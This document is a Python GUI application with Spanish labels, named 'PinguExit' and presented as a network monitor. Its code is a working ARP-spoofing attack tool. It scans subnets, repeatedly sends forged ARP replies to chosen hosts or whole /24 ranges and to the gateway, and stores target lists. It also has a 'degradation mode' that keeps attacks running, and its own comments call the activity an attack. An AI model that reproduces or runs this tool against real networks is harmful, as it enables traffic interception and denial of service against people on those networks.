import os
import ipaddress
import json
import socket
import threading
import time
import tkinter as tk
import uuid
from pathlib import Path
from tkinter import messagebox, scrolledtext, ttk

from scapy.all import ARP, Ether, send, srp

# Dirección IP de la puerta de enlace (se obtiene automáticamente)
ip_puerta_enlace = None

# Obtener la dirección MAC del atacante (máquina local)
mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])

ataque_en_curso = False
ARCHIVO_OBJETIVOS = Path.home() / ".pingu_exit_targets.json"
MAX_RECIENTES = 8

def cargar_objetivos():
    """Carga los objetivos persistidos sin impedir que arranque la aplicación."""
    try:
        datos = json.loads(ARCHIVO_OBJETIVOS.read_text(encoding="utf-8"))
        recientes = [str(valor) for valor in datos.get("recientes", []) if valor]
        guardadas = {
            str(nombre): str(valor)
            for nombre, valor in datos.get("guardadas", {}).items()
            if nombre and valor
        }
        return recientes[:MAX_RECIENTES], guardadas
    except (OSError, ValueError, TypeError):
        return [], {}


def guardar_objetivos(recientes, guardadas):
    datos = {"recientes": recientes[:MAX_RECIENTES], "guardadas": guardadas}
    try:
        ARCHIVO_OBJETIVOS.write_text(
            json.dumps(datos, ensure_ascii=False, indent=2),
            encoding="utf-8",
        )
    except OSError as error:
        escribir_log(f"No se pudieron guardar los objetivos: {error}")


def registrar_objetivo_actual():
    objetivo = entrada_ip.get().strip()
    if objetivo and objetivo in objetivos_recientes:
        objetivos_recientes.remove(objetivo)
    if objetivo:
        objetivos_recientes.insert(0, objetivo)
        del objetivos_recientes[MAX_RECIENTES:]
        refrescar_listas()
        guardar_objetivos(objetivos_recientes, objetivos_guardados)


def seleccionar_objetivo(valor):
    entrada_ip.delete(0, tk.END)
    entrada_ip.insert(0, valor)
    entrada_ip.focus_set()


def seleccionar_reciente():
    seleccion = lista_recientes.curselection()
    if seleccion:
        seleccionar_objetivo(lista_recientes.get(seleccion[0]))


def seleccionar_guardada():
    seleccion = lista_guardadas.curselection()
    if seleccion:
        nombre = lista_guardadas.get(seleccion[0]).split("  ·  ", 1)[0]
        seleccionar_objetivo(objetivos_guardados[nombre])


def guardar_objetivo_con_nombre():
    nombre = nombre_objetivo.get().strip()
    objetivo = entrada_ip.get().strip()
    if not nombre or not objetivo:
        messagebox.showwarning("Datos incompletos", "Indica un nombre y una IP o red.")
        return
    objetivos_guardados[nombre] = objetivo
    nombre_objetivo.delete(0, tk.END)
    refrescar_listas()
    guardar_objetivos(objetivos_recientes, objetivos_guardados)
    escribir_log(f"Objetivo guardado: {nombre} · {objetivo}")


def borrar_objetivo_guardado():
    seleccion = lista_guardadas.curselection()
    if not seleccion:
        return
    nombre = lista_guardadas.get(seleccion[0]).split("  ·  ", 1)[0]
    objetivos_guardados.pop(nombre, None)
    refrescar_listas()
    guardar_objetivos(objetivos_recientes, objetivos_guardados)


def obtener_redes_a_escanear():
    valores = entrada_ip.get().replace(",", " ").split()
    redes = []
    direcciones_individuales = []
    for valor in valores:
        try:
            if valor.endswith(".*"):
                red = ipaddress.ip_network(f"{valor[:-2]}.0/24", strict=False)
            elif "/" in valor:
                red = ipaddress.ip_network(valor, strict=False)
            else:
                direccion = ipaddress.ip_address(valor)
                if direccion not in direcciones_individuales:
                    direcciones_individuales.append(direccion)
                continue
            if red not in redes:
                redes.append(red)
        except ValueError:
            escribir_log(f"Red no válida para escanear: {valor}")

    if not redes and not direcciones_individuales and ip_puerta_enlace:
        try:
            redes.append(ipaddress.ip_network(f"{ip_puerta_enlace}/24", strict=False))
        except ValueError:
            pass
    return redes, direcciones_individuales


def escanear_red():
    """Muestra únicamente las IP que responden a una solicitud ARP."""
    redes, direcciones_individuales = obtener_redes_a_escanear()
    objetivos = [str(direccion) for direccion in direcciones_individuales]
    for red in redes:
        if red.num_addresses > 1024:
            escribir_log(f"No se escanea {red}: supera el límite de 1024 direcciones.")
            continue
        objetivos.extend(str(host) for host in red.hosts())

    if not objetivos:
        lista_red.delete(0, tk.END)
        escribir_log("Escribe una IP o red para escanear.")
        return

    lista_red.delete(0, tk.END)
    boton_escanear.state(["disabled"])
    escribir_log(f"Escaneando {len(objetivos)} direcciones mediante ARP...")
    threading.Thread(target=ejecutar_escaneo, args=(objetivos,), daemon=True).start()


def ejecutar_escaneo(objetivos):
    disponibles = {}
    try:
        paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=objetivos)
        respuestas = srp(paquete, timeout=2, verbose=0)[0]
        disponibles = {
            recibido.psrc: recibido.hwsrc
            for _, recibido in respuestas
        }
    except Exception as error:
        ventana.after(0, lambda: escribir_log(f"Error durante el escaneo: {error}"))
    ventana.after(0, lambda: mostrar_resultado_escaneo(disponibles))


def mostrar_resultado_escaneo(disponibles):
    lista_red.delete(0, tk.END)
    for ip, mac in sorted(disponibles.items(), key=lambda item: ipaddress.ip_address(item[0])):
        lista_red.insert(tk.END, f"{ip}  ·  {mac}")
    boton_escanear.state(["!disabled"])
    if disponibles:
        escribir_log(f"Escaneo terminado: {len(disponibles)} direcciones disponibles.")
    else:
        escribir_log("Escaneo terminado: no respondió ninguna dirección.")


def refrescar_listas():
    lista_recientes.delete(0, tk.END)
    for valor in objetivos_recientes:
        lista_recientes.insert(tk.END, valor)
    lista_guardadas.delete(0, tk.END)
    for nombre, valor in objetivos_guardados.items():
        lista_guardadas.insert(tk.END, f"{nombre}  ·  {valor}")


def escribir_log(mensaje):
    """Añade un mensaje a la consola desde cualquier hilo de trabajo."""
    def actualizar():
        widget_salida.insert(tk.END, mensaje + "\n")
        widget_salida.see(tk.END)

    ventana.after(0, actualizar)

# Función para obtener la dirección MAC de un dispositivo dada su IP
def obtener_mac(ip):
    solicitud_arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Dirección MAC de broadcast
    paquete = ether / solicitud_arp
    resultado = srp(paquete, timeout=2, verbose=0)[0]
    for enviado, recibido in resultado:
        return recibido.hwsrc

def spoofing_arp(ip_objetivo, widget_salida):
    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)  # Obtener la MAC del objetivo
    if not mac_objetivo:
        escribir_log(f"No se pudo obtener la dirección MAC del objetivo {ip_objetivo}.")
        if not modo_degradacion.get():
            ataque_en_curso = False
            ventana.after(0, lambda: actualizar_estado(False))
        return

    if not ip_puerta_enlace:
        escribir_log(
            f"No se puede monitorizar {ip_objetivo}: no hay puerta de enlace detectada."
        )
        if not modo_degradacion.get():
            ataque_en_curso = False
            ventana.after(0, lambda: actualizar_estado(False))
        return

    escribir_log(f"Dirección MAC del objetivo {ip_objetivo}: {mac_objetivo}")
    
    try:
        # Paquete ARP de respuesta hacia el objetivo
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)

        # Paquete ARP de respuesta hacia la puerta de enlace (con MAC de broadcast)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

        while ataque_en_curso:
            # Enviar los paquetes ARP en ambas direcciones
            send(respuesta_arp_objetivo, verbose=0)
            send(respuesta_arp_puerta, verbose=0)
            
            escribir_log(f"Enviando ARP spoofing a {ip_objetivo}...")
            time.sleep(2)
    
    except Exception as error:
        escribir_log(f"Ocurrió un error con {ip_objetivo}: {error}")
        if not modo_degradacion.get():
            ataque_en_curso = False
            restaurar_conexion(ip_objetivo)
            ventana.after(0, lambda: actualizar_estado(False))

# Función para restaurar la conexión en caso de error
def restaurar_conexion(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)

    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)

        send(respuesta_arp_objetivo, count=5, verbose=0)
        send(respuesta_arp_puerta, count=5, verbose=0)
        print("Conexión restaurada.")
    else:
        print("No se pudo restaurar la conexión: no se pudieron obtener direcciones MAC.")

def obtener_ips_locales():
    ips_locales = {"127.0.0.1"}
    try:
        for informacion in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ips_locales.add(informacion[4][0])
    except socket.gaierror:
        pass

    if ip_puerta_enlace:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as conexion:
                conexion.connect((ip_puerta_enlace, 1))
                ips_locales.add(conexion.getsockname()[0])
        except OSError:
            pass

    return ips_locales


def es_ip_local_explicita(valor, ip_objetivo, ips_locales):
    """Indica si el objetivo es una IP local escrita directamente por el usuario."""
    if valor.endswith(".*") or "/" in valor:
        return False
    try:
        ip_escrita = ipaddress.ip_address(valor)
    except ValueError:
        return False
    return (
        ip_escrita == ip_objetivo
        and ip_objetivo in ips_locales
        and ip_objetivo != ipaddress.ip_address("127.0.0.1")
    )


def expandir_ip_objetivo(ip_objetivo):
    if not ip_objetivo.endswith(".*"):
        ipaddress.ip_address(ip_objetivo)
        return [ip_objetivo]

    prefijo = ip_objetivo[:-2]
    red = ipaddress.ip_network(f"{prefijo}.0/24", strict=False)
    return [str(ip) for ip in red.hosts()]


# Función para iniciar el ataque ARP spoofing
def iniciar_spoofing():
    global ataque_en_curso
    registrar_objetivo_actual()
    widget_salida.delete(1.0, tk.END)
    ips_locales = obtener_ips_locales()
    ips_validas = []

    for valor in entrada_ip.get().replace(",", " ").split():
        try:
            for ip_objetivo in expandir_ip_objetivo(valor):
                puede_incluir_local = (
                    incluir_equipo_local.get()
                    and es_ip_local_explicita(valor, ipaddress.ip_address(ip_objetivo), ips_locales)
                )
                if ip_objetivo in ips_locales and not puede_incluir_local:
                    widget_salida.insert(
                        tk.END,
                        f"Se omite {ip_objetivo}: es una IP de esta máquina.\n",
                    )
                elif ip_objetivo not in ips_validas:
                    ips_validas.append(ip_objetivo)
        except ValueError:
            widget_salida.insert(tk.END, f"IP o red no válida: {valor}\n")

    if ips_validas:
        ataque_en_curso = True
        for ip_objetivo in ips_validas:
            hilo = threading.Thread(
                target=spoofing_arp,
                args=(ip_objetivo, widget_salida),
                daemon=True,
            )
            hilo.start()
        actualizar_estado(True)
    else:
        actualizar_estado(False)
        escribir_log("No se encontraron IPs objetivo válidas.")

# Función para detener el ataque
def detener_spoofing():
    global ataque_en_curso
    ataque_en_curso = False  
    actualizar_estado(False)
    escribir_log("Ataque cancelado.")

# Función para obtener la puerta de enlace automáticamente
def obtener_puerta_enlace():
    # Obtener la IP de la puerta de enlace por defecto en la máquina
    gateway = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
    return gateway

# Ventana de la interfaz gráfica
ventana = tk.Tk()
ventana.title("PinguExit · Monitor de red")
ventana.geometry("1200x860")
ventana.minsize(1000, 740)
ventana.configure(bg="#101827")
modo_degradacion = tk.BooleanVar(ventana, value=False)
incluir_equipo_local = tk.BooleanVar(ventana, value=False)

COLOR_FONDO = "#101827"
COLOR_PANEL = "#182337"
COLOR_PANEL_CLARO = "#22314a"
COLOR_TEXTO = "#edf4ff"
COLOR_SECUNDARIO = "#9eb0c9"
COLOR_AZUL = "#55a9ff"
COLOR_VERDE = "#55d187"
COLOR_ROJO = "#ff6b7a"

objetivos_recientes, objetivos_guardados = cargar_objetivos()

estilo = ttk.Style(ventana)
estilo.theme_use("clam")
estilo.configure("App.TFrame", background=COLOR_FONDO)
estilo.configure("Panel.TFrame", background=COLOR_PANEL)
estilo.configure("Title.TLabel", background=COLOR_FONDO, foreground=COLOR_TEXTO,
                 font=("TkDefaultFont", 24, "bold"))
estilo.configure("Subtitle.TLabel", background=COLOR_FONDO, foreground=COLOR_SECUNDARIO,
                 font=("TkDefaultFont", 10))
estilo.configure("Panel.TLabel", background=COLOR_PANEL, foreground=COLOR_TEXTO,
                 font=("TkDefaultFont", 10))
estilo.configure("Hint.TLabel", background=COLOR_PANEL, foreground=COLOR_SECUNDARIO,
                 font=("TkDefaultFont", 9, "bold"))
estilo.configure("Status.TLabel", background=COLOR_PANEL, foreground=COLOR_SECUNDARIO,
                 font=("TkDefaultFont", 10, "bold"))
estilo.configure("Start.TButton", background=COLOR_AZUL, foreground="#08111f",
                 font=("TkDefaultFont", 10, "bold"), padding=(16, 9), borderwidth=0)
estilo.map("Start.TButton", background=[("active", "#82c3ff")])
estilo.configure("Stop.TButton", background=COLOR_ROJO, foreground="#21070b",
                 font=("TkDefaultFont", 10, "bold"), padding=(16, 9), borderwidth=0)
estilo.map("Stop.TButton", background=[("active", "#ff9aa5")])
estilo.configure("Small.TButton", padding=(8, 5))

marco_principal = ttk.Frame(ventana, style="App.TFrame")
marco_principal.pack(fill="both", expand=True)

canvas = tk.Canvas(
    marco_principal,
    background=COLOR_FONDO,
    highlightthickness=0,
    borderwidth=0,
)
barra_desplazamiento = ttk.Scrollbar(
    marco_principal, orient="vertical", command=canvas.yview
)
canvas.configure(yscrollcommand=barra_desplazamiento.set)
canvas.pack(side="left", fill="both", expand=True)
barra_desplazamiento.pack(side="right", fill="y")

contenedor = ttk.Frame(canvas, style="App.TFrame", padding=(28, 24))
ventana_contenedor = canvas.create_window((0, 0), window=contenedor, anchor="nw")


def actualizar_area_desplazable(event=None):
    canvas.configure(scrollregion=canvas.bbox("all"))


def ajustar_ancho_contenedor(event):
    canvas.itemconfigure(ventana_contenedor, width=event.width)


def desplazar_con_rueda(event):
    if event.delta:
        canvas.yview_scroll(int(-event.delta / 120), "units")
    elif event.num == 4:
        canvas.yview_scroll(-3, "units")
    elif event.num == 5:
        canvas.yview_scroll(3, "units")


contenedor.bind("<Configure>", actualizar_area_desplazable)
canvas.bind("<Configure>", ajustar_ancho_contenedor)
canvas.bind_all("<MouseWheel>", desplazar_con_rueda)
canvas.bind_all("<Button-4>", desplazar_con_rueda)
canvas.bind_all("<Button-5>", desplazar_con_rueda)

contenedor.columnconfigure(0, weight=3)
contenedor.columnconfigure(1, weight=2)
contenedor.rowconfigure(3, weight=5)
contenedor.rowconfigure(4, weight=1)

ttk.Label(contenedor, text="PinguExit", style="Title.TLabel").grid(row=0, column=0, columnspan=2, sticky="w")
ttk.Label(
    contenedor, text="Monitor de red · objetivos claros, sesiones más rápidas",
    style="Subtitle.TLabel",
).grid(row=1, column=0, columnspan=2, sticky="w", pady=(2, 20))

panel_config = ttk.Frame(contenedor, style="Panel.TFrame", padding=18)
panel_config.grid(row=2, column=0, columnspan=2, sticky="ew", pady=(0, 16))
panel_config.columnconfigure(0, weight=1)
ttk.Label(panel_config, text="OBJETIVO ACTUAL", style="Hint.TLabel").grid(row=0, column=0, sticky="w")
ttk.Label(panel_config, text="IP individual, comodín (192.168.1.*) o red CIDR (192.168.1.0/24)",
          style="Panel.TLabel").grid(row=1, column=0, sticky="w", pady=(3, 8))
entrada_ip = tk.Entry(panel_config, bg=COLOR_PANEL_CLARO, fg=COLOR_TEXTO,
                      insertbackground=COLOR_TEXTO, relief="flat",
                      font=("TkDefaultFont", 11), width=34)
entrada_ip.grid(row=2, column=0, sticky="ew", ipady=9)
entrada_ip.insert(0, "172.16.3.*")

barra_guardar = ttk.Frame(panel_config, style="Panel.TFrame")
barra_guardar.grid(row=3, column=0, sticky="ew", pady=(12, 0))
barra_guardar.columnconfigure(0, weight=1)
ttk.Label(barra_guardar, text="Nombre identificativo", style="Hint.TLabel").grid(
    row=0, column=0, sticky="w", pady=(0, 4)
)
nombre_objetivo = tk.Entry(
    barra_guardar, bg=COLOR_PANEL_CLARO, fg=COLOR_TEXTO,
    insertbackground=COLOR_TEXTO, relief="flat", font=("TkDefaultFont", 10), width=24,
)
nombre_objetivo.grid(row=1, column=0, sticky="ew", ipady=7)
ttk.Button(barra_guardar, text="＋ Guardar con nombre", command=guardar_objetivo_con_nombre,
           style="Small.TButton").grid(row=1, column=1, padx=(10, 0))
boton_escanear = ttk.Button(
    barra_guardar, text="⌁ Escanear disponibles", command=escanear_red,
    style="Small.TButton",
)
boton_escanear.grid(row=1, column=2, padx=(8, 0))

barra_acciones = ttk.Frame(panel_config, style="Panel.TFrame")
barra_acciones.grid(row=4, column=0, sticky="ew", pady=(14, 0))
boton_iniciar = ttk.Button(barra_acciones, text="▶  Iniciar monitor",
                           command=iniciar_spoofing, style="Start.TButton")
boton_iniciar.pack(side="left")
boton_detener = ttk.Button(barra_acciones, text="■  Detener",
                           command=detener_spoofing, style="Stop.TButton")
boton_detener.pack(side="left", padx=(10, 0))
ttk.Checkbutton(
    barra_acciones,
    text="Modo degradación",
    variable=modo_degradacion,
).pack(side="left", padx=(18, 0))
ttk.Checkbutton(
    barra_acciones,
    text="Incluir equipo local",
    variable=incluir_equipo_local,
).pack(side="left", padx=(12, 0))
estado_var = tk.StringVar(value="●  En espera")
estado_label = ttk.Label(panel_config, textvariable=estado_var, style="Status.TLabel")
estado_label.grid(row=5, column=0, sticky="w", pady=(12, 0))

panel_listas = ttk.Frame(contenedor, style="Panel.TFrame", padding=14)
panel_listas.grid(row=3, column=1, sticky="nsew", padx=(12, 0))
panel_listas.columnconfigure(0, weight=1)
panel_listas.rowconfigure(2, weight=1)
panel_listas.rowconfigure(4, weight=2)
ttk.Label(panel_listas, text="BIBLIOTECA DE OBJETIVOS", style="Hint.TLabel").grid(
    row=0, column=0, sticky="w")
ttk.Label(panel_listas, text="Doble clic para usar un objetivo", style="Panel.TLabel").grid(
    row=1, column=0, sticky="w", pady=(3, 6))
lista_recientes = tk.Listbox(panel_listas, height=4, bg=COLOR_PANEL_CLARO, fg=COLOR_TEXTO,
                             selectbackground="#35658e", relief="flat", borderwidth=0,
                             font=("TkDefaultFont", 10), activestyle="none")
lista_recientes.grid(row=2, column=0, sticky="nsew")
lista_recientes.bind("<Double-Button-1>", lambda _: seleccionar_reciente())
ttk.Label(panel_listas, text="GUARDADAS", style="Hint.TLabel").grid(row=3, column=0, sticky="w", pady=(14, 5))
lista_guardadas = tk.Listbox(panel_listas, height=5, bg=COLOR_PANEL_CLARO, fg=COLOR_TEXTO,
                             selectbackground="#35658e", relief="flat", borderwidth=0,
                             font=("TkDefaultFont", 10), activestyle="none")
lista_guardadas.grid(row=4, column=0, sticky="nsew")
lista_guardadas.bind("<Double-Button-1>", lambda _: seleccionar_guardada())
desplazamiento_guardadas = ttk.Scrollbar(
    panel_listas, orient="horizontal", command=lista_guardadas.xview
)
desplazamiento_guardadas.grid(row=5, column=0, sticky="ew", pady=(3, 0))
lista_guardadas.configure(xscrollcommand=desplazamiento_guardadas.set)
ttk.Button(panel_listas, text="Eliminar guardada", command=borrar_objetivo_guardado,
           style="Small.TButton").grid(row=6, column=0, sticky="se", pady=(8, 0))

panel_salida = ttk.Frame(contenedor, style="Panel.TFrame", padding=14)
panel_salida.grid(row=3, column=0, sticky="nsew")
panel_salida.columnconfigure(0, weight=1)
panel_salida.rowconfigure(1, weight=1)
ttk.Label(panel_salida, text="ACTIVIDAD", style="Hint.TLabel").grid(row=0, column=0, sticky="w", pady=(0, 8))
widget_salida = scrolledtext.ScrolledText(
    panel_salida, bg="#0d1522", fg="#c9d8eb", insertbackground=COLOR_TEXTO,
    selectbackground="#31577f", relief="flat", borderwidth=0, padx=12, pady=10,
    font=("TkFixedFont", 10))
widget_salida.grid(row=1, column=0, sticky="nsew")

panel_red = ttk.Frame(contenedor, style="Panel.TFrame", padding=14)
panel_red.grid(row=4, column=0, columnspan=2, sticky="ew", pady=(16, 0))
panel_red.columnconfigure(0, weight=1)
ttk.Label(panel_red, text="DIRECCIONES DISPONIBLES", style="Hint.TLabel").grid(row=0, column=0, sticky="w")
ttk.Label(panel_red, text="Solo aparecen hosts que responden al escaneo ARP", style="Panel.TLabel").grid(
    row=1, column=0, sticky="w", pady=(3, 6))
lista_red = tk.Listbox(panel_red, height=4, bg=COLOR_PANEL_CLARO, fg=COLOR_TEXTO,
                       selectbackground="#35658e", relief="flat", borderwidth=0,
                       font=("TkFixedFont", 10), activestyle="none")
lista_red.grid(row=2, column=0, sticky="ew", ipady=8)


def actualizar_estado(en_curso):
    if en_curso:
        estado_var.set("●  Monitor activo")
        estado_label.configure(foreground=COLOR_VERDE)
        boton_iniciar.state(["disabled"])
        boton_detener.state(["!disabled"])
    else:
        estado_var.set("●  En espera")
        estado_label.configure(foreground=COLOR_SECUNDARIO)
        boton_iniciar.state(["!disabled"])
        boton_detener.state(["disabled"])


# Inicializamos la puerta de enlace automáticamente
ip_puerta_enlace = obtener_puerta_enlace()
refrescar_listas()
actualizar_estado(False)
widget_salida.insert(
    tk.END,
    f"Puerta de enlace detectada: {ip_puerta_enlace or 'no disponible'}\n"
    "Los objetivos guardados se almacenan en tu carpeta personal.\n",
)
widget_salida.insert(tk.END, "Pulsa «Escanear disponibles» para buscar hosts activos.\n")

ventana.mainloop()
